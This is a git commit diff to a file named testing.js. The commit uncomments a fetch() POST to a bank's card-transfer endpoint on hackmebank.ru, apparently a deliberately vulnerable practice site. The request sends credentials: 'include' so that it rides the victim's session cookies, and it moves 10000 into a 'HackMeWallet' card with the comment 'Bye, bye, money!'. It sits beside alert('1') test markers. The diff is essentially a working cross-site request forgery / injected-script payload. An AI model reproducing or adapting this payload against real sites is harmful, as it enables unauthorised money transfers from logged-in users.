8efa92a236e6fa24ca09606d24b177b65c7a0c0f
Unknown <43906486+noproblemmo@users.noreply.github.com>
2022-05-18 10:15:14 +0300

    Update testing.js

--- testing.js
+++ testing.js
@@ -1,4 +1,4 @@
-/* fetch('http://hackmebank.ru/transfer/transferByCardNumber', {
+fetch('http://hackmebank.ru/transfer/transferByCardNumber', {
     method: 'POST',
     credentials: 'include',
     body: 'fromSerialNumber=40817810300004562147&toHackMeWallet=4371081842239017&comment=Bye%2C+bye%2C+money%21&amountMoney=10000',
@@ -7,11 +7,9 @@
 		'Upgrade-Insecure-Requests': 1,
 		'Content-Type': 'application/x-www-form-urlencoded',
 		'Referer': 'http://hackmebank.ru/transferOperation',
-		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
+ 		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
     }
 }).then(response => console.log("Response status: ", response.status));
-
-*/
 
 alert('1');
 console.log('86125892')
